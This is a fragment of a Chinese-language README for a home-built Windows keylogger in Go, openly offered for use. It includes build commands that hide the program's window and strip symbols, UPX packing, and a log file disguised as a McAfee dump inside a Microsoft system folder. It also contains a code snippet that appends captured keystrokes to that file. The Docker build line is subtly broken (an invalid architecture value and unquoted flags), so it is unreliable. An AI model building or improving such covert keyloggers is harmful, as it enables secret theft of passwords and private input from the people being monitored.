...
### 说明
网上找了几款键盘记录工具都不好用,遂在其它开源基础上造一个轮子
...
**写得比较仓促缺乏测试,有bug或其它需求欢迎联系本人**

**记录内容保存在:**

`C:\Users\[user]\AppData\Local\Packages\Microsoft.Messaging_8wekyb3d8bbwe\Mcafee_dump.tmp`

编译方法:

`go build -ldflags "-s -w -H=windowsgui" key.go`

使用`docker`环境编译:
```
docker run  --rm -it -v ${PWD}:/go golang:stretch env  GO111MODULE=on GOPROXY=https://goproxy.io GOOS=windows GOARCH=x64 CGO_ENABLED=0 go build -ldflags -s -w -H=windowsgui key.go
```
 upx 压缩 : 
 `upx.exe -k -9 windowslogger.exe`
...
func savefile(str string) {
    ...
    f, err := os.OpenFile(dir+"Mcafee_dump.tmp", os.O_RDWR|os.O_CREATE|os.O_APPEND, 0644)
    if err != nil {
